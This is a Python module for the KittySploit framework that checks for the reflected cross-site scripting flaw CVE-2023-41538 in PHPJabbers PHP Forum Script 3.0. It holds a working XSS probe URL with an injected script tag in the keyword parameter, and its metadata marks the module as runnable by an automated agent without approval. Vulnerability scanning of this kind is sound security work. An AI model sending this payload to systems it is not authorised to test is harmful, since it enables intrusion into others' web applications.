#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""PhpJabbers PHP Forum Script 3."""

from kittysploit import *
from lib.protocols.http.http_client import Http_client


class Module(Scanner, Http_client):
    __info__ = {
        'name': 'PHPJabbers PHP Forum Script 3.0 - Cross-Site Scripting Detection',
        'description': 'PhpJabbers PHP Forum Script 3.0 is vulnerable to Cross Site Scripting (XSS) via the keyword parameter.',
        'author': ['KittySploit Team'],
        'severity': 'medium',
        'tags': ['web', 'scanner', 'cve', 'cve2023', 'xss', 'phpjabber', 'jabber', 'phpjabbers', 'vuln'],
        'agent': {
            'risk': 'active',
            'effects': ['network_probe'],
            'expected_requests': 1,
            'reversible': True,
            'approval_required': False,
            'produces': ['tech_hints', 'risk_signals', 'endpoints'],
            'cost': 1.0,
            'noise': 0.3,
            'value': 1.0,
            'requires': {
                'min_endpoints': 0,
                'min_params': 0,
                'tech_hints_any': [],
                'tech_hints_all': [],
                'specializations_any': [],
                'risk_signals_any': [],
                'auth_session': False,
                'capabilities_any': [],
                'capabilities_all': [],
                'confidence_min': {},
                'confidence_min_any': {},
                'endpoint_pattern_any': [],
                'param_any': [],
                'api_surface_ready': False,
            },
            'chain': {
                'produces_capabilities': [
                    {
                        'capability': 'admin_surface',
                        'from_detail': '',
                    },
                ],
                'consumes_capabilities': [],
                'option_bindings': {},
                'suggested_followups': ['auxiliary/scanner/http/login_page_detector'],
            },
        },
        'references': [
            'https://github.com/nu11secur1ty/CVE-nu11secur1ty/tree/main/vendors/phpjabbers/2023/PHP-Forum-Script-3.0',
            'https://nvd.nist.gov/vuln/detail/CVE-2023-41538',
            'https://github.com/2lambda123/Windows10Exploits',
            'https://github.com/codeb0ss/CVE-2023-41538-PoC',
            'https://github.com/nomi-sec/PoC-in-GitHub',
        ],
        'cve': 'CVE-2023-41538',
    }

    def run(self):
        r = self.http_request(method="GET", path='/preview.php?controller=pjLoad&action=pjActionIndex&question_search=1&pjPage=1&column=created&direction=DESC&keyword=%22><script>alert(document.domain)</script>', allow_redirects=False)
        if not r or r.status_code != 200:
            return False
        body = r.text or ""
        body_any = ('text/html',)
        body_all = ('New Question', '><script>alert(document.domain)</script>',)
        if (any(m in body for m in body_any)) and (all(m in body for m in body_all)):
            self.set_info(
                severity='medium',
                reason="PHPJabbers PHP Forum Script 3.0 - Cross-Site Scripting detected",
                path='/preview.php?controller=pjLoad&action=pjActionIndex&question_search=1&pjPage=1&column=created&direction=DESC&keyword=%22><script>alert(document.domain)</script>',
            )
            return True
        return False

